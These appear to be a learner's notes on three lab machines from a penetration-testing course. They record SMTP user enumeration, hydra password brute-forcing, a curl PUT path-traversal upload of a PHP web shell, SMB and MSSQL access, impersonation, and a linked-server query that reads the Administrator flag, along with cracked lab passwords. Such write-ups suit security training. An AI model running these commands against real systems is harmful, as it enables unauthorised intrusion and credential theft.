# Lab - Easy
---
- `10.129.203.7`
- `smtp-user-enum -M RCPT -U final.txt  -D inlanefreight.htb -t 10.129.81.74`
	- `fiona@inlanefreight.htb`
	- ![[Pasted image 20250713070015.png]]

- `hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -f 10.129.81.74 smtp -I -v`
	- `fiona@inlanefreight.htb`: `987654321`
	- ![[Pasted image 20250713071521.png]]

- Login with FTP to get hint:
	- ![[Pasted image 20250713083117.png]]
- Modify test.php using PUT method:
	- `curl -k -X PUT -H "Host: 10.129.81.70" --basic -u fiona:987654321 --path-as-is https://10.129.81.70/../../../../../../xampp/htdocs/test.php --data-binary '<?=`$_GET[0]`?>'`

- Access the flag:
	- ![[Pasted image 20250713083221.png]]

# Lab - Medium
---
- The second server is an **internal server** (within the `inlanefreight.htb` domain) that manages and **stores emails and files and serves as a backup** of some of the company's processes. 
- From internal conversations, we heard that this is **used relatively rarely** and, in most cases, has **only been used for testing** purposes so far.

- Nothing unusual came up from common ports except that we can do DNS zone transfer:
	- ![[Pasted image 20250714060950.png]]
- But this was not helpful either

- Scanned all the ports using rustscan and found port `30021` to be open with ftp:
	- `simon` user found
	- ![[Pasted image 20250714061034.png]]
- ![[Pasted image 20250714061113.png]]
- `hydra -l simon -P mynotes.txt  ftp://10.129.201.127:2121 -I`
	- ![[Pasted image 20250714061306.png]]
	- `simon`: `8Ns8j1b!23hs4921smHzwn`
	- ![[Pasted image 20250714061408.png]]

# Lab - Hard
---
- The third server is another **internal server used to manage files and working material, such as forms**. 
- In addition, **a database is used on the server,** the purpose of which we do not know.

![[Pasted image 20250714071119.png]]
- `smbclient //10.129.220.222/Home -U simon`
	- Use Null/Empty Password
![[Pasted image 20250714071621.png]]
- `netexec smb 10.129.220.222 -u fiona -p Fiona/creds.txt`
	- `fiona`:`48Ns72!bns74@S84NNNSl`
	- ![[Pasted image 20250714071721.png]]
- `impacket-mssqlclient fiona@10.129.220.222 -windows-auth`
	- ![[Pasted image 20250714071947.png]]
- `enum_impersonate`
	- ![[Pasted image 20250714074918.png]]
- `exec_as_user john`
	- We (as john) are still not `SYSADMIN` on this server
- `SELECT srvname, isremote FROM sysservers`
	- ![[Pasted image 20250714075010.png]]
- Read Administrator Flag:
	- `EXECUTE('SELECT * FROM OPENROWSET(BULK N''C:/Users/Administrator/Desktop/flag.txt'', SINGLE_CLOB) AS Contents') AT [LOCAL.TEST.LINKED.SRV]`
	- ![[Pasted image 20250714075048.png]]